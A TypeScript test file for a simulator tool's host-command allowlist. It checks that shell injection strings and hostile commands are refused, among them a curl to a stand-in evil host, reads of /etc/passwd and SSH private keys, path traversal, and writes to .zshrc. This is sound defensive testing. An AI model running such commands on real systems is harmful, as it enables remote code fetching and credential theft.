import { describe, expect, test } from "bun:test";
import { existsSync, readFileSync } from "fs";
import { resolveHostCommand, runHostCommand, splitHostCommand } from "../host-commands";

const UDID = "40F4DA0A-4BE2-4B86-A1FA-C9A9440227B6";
const BIN = "/opt/serve-sim/dist/serve-sim.js";
const ctx = { serveSimBin: BIN };
const allowed = (command: string) => {
  const argv = splitHostCommand(command);
  return argv ? resolveHostCommand(argv, ctx) : null;
};

describe("splitHostCommand", () => {
  test("splits bare words and single-quoted strings", () => {
    expect(splitHostCommand("open -R '/Users/me/My App.app'")).toEqual(["open", "-R", "/Users/me/My App.app"]);
    expect(splitHostCommand("a 'it'\\''s' b")).toEqual(["a", "it's", "b"]);
  });

  test("rejects anything a shell would interpret", () => {
    for (const command of [
      "echo hi; id",
      "echo hi && id",
      "echo hi | sh",
      "echo $(id)",
      "echo `id`",
      "echo $HOME",
      "echo hi > /tmp/x",
      "cat < /etc/passwd",
      'echo "hi"',
      "ls ~",
      "ls *",
      "echo hi\nid",
      "echo 'unterminated",
    ]) {
      expect(splitHostCommand(command)).toBeNull();
    }
  });
});

describe("host command allowlist", () => {
  test("allows the commands the preview UI issues", () => {
    for (const command of [
      `xcrun simctl ui ${UDID} appearance`,
      `xcrun simctl ui ${UDID} appearance dark`,
      `xcrun simctl location ${UDID} set 37.3349000,-122.0090000`,
      `xcrun simctl location ${UDID} clear`,
      `xcrun simctl get_app_container ${UDID} 'com.example.app' app`,
      `xcrun simctl launch ${UDID} com.apple.springboard`,
      `xcrun simctl addmedia ${UDID} '/Users/me/Desktop/serve-sim-screenshot-1.png'`,
      `xcrun simctl install ${UDID} /tmp/serve-sim-install-123e4567-e89b-12d3-a456-426614174000.ipa`,
      "plutil -convert json -o - '/a/Containers/Bundle/Application/X/Demo.app/Info.plist'",
      "base64 -i '/a/Containers/Bundle/Application/X/Demo.app/AppIcon60x60@3x.png'",
      "open -R '/Users/me/Desktop/shot.png'",
      `osascript -e 'tell application "System Events" to tell process "Simulator" to set frontmost to true'`,
      "serve-sim button home",
      `node '${BIN}' camera --list-webcams`,
      `node '${BIN}' permissions grant camera 'com.example.app' -d '${UDID}'`,
    ]) {
      expect(allowed(command)).not.toBeNull();
    }
  });

  test("runs the serve-sim CLI through the current runtime, never a shell", () => {
    expect(allowed(`node '${BIN}' rotate landscape_left -d ${UDID}`)).toEqual({
      file: process.execPath,
      args: [BIN, "rotate", "landscape_left", "-d", UDID],
    });
  });

  test("refuses everything else", () => {
    for (const command of [
      "id",
      "curl http://evil.example/x.sh",
      "bash -c 'id'",
      "sh -c id",
      "node -e 'process.exit(0)'",
      "node /tmp/evil.js camera --list-webcams",
      `node '${BIN}' --host 0.0.0.0`,
      `xcrun simctl spawn ${UDID} launchctl print system`,
      `xcrun simctl ui not-a-udid appearance`,
      `xcrun simctl install ${UDID} /tmp/other.ipa`,
      `xcrun simctl addmedia ${UDID} /etc/passwd`,
      "xcrun xcodebuild -version",
      "plutil -convert json -o - /Users/me/Library/Preferences/secret.plist",
      "base64 -i /Users/me/.ssh/id_ed25519",
      "base64 -i /a/Demo.app/../../../.ssh/key.png",
      "open /Applications/Calculator.app",
      "osascript -e 'do shell script \"id\"'",
    ]) {
      expect(allowed(command)).toBeNull();
    }
  });

  test("a refused command is not executed and reports why", async () => {
    const marker = `/tmp/serve-sim-host-commands-test-${process.pid}`;
    for (const command of [`touch ${marker}`, `bash -c 'touch ${marker}'`, `echo x > ${marker}`]) {
      const result = await runHostCommand(command, ctx);
      expect(result.exitCode).toBe(126);
      expect(result.stderr).toContain("not allowed");
    }
    expect(existsSync(marker)).toBe(false);
  });

  test("unsafe mode restores the free-form shell", async () => {
    const result = await runHostCommand("echo one && echo two", { ...ctx, allowArbitrary: true });
    expect(result).toEqual({ stdout: "one\ntwo\n", stderr: "", exitCode: 0 });
  });
});

describe("serve-sim: host actions", () => {
  const staged = "/tmp/serve-sim-upload-123e4567-e89b-12d3-a456-426614174000.png";

  test("write-tmp stages a file in chunks and rm-tmp removes it", async () => {
    const first = Buffer.from("hello ").toString("base64");
    const second = Buffer.from("world").toString("base64");
    expect((await runHostCommand(`serve-sim:write-tmp ${staged} create ${first}`, ctx)).exitCode).toBe(0);
    expect((await runHostCommand(`serve-sim:write-tmp ${staged} append ${second}`, ctx)).exitCode).toBe(0);
    expect(readFileSync(staged, "utf-8")).toBe("hello world");
    expect((await runHostCommand(`serve-sim:rm-tmp ${staged}`, ctx)).exitCode).toBe(0);
    expect(existsSync(staged)).toBe(false);
  });

  test("only writes or removes serve-sim's own staging files", async () => {
    const data = Buffer.from("x").toString("base64");
    for (const command of [
      `serve-sim:write-tmp /tmp/evil.sh create ${data}`,
      `serve-sim:write-tmp /Users/me/.zshrc append ${data}`,
      `serve-sim:write-tmp /tmp/serve-sim-upload-123e4567-e89b-12d3-a456-426614174000.png/../x create ${data}`,
      "serve-sim:rm-tmp /etc/hosts",
      "serve-sim:thumbnail /Users/me/.ssh/id_ed25519",
      "serve-sim:first-file /etc/passwd",
      "serve-sim:screenshot not-a-udid 1",
      "serve-sim:unknown",
    ]) {
      expect((await runHostCommand(command, ctx)).exitCode).toBe(126);
    }
  });
});
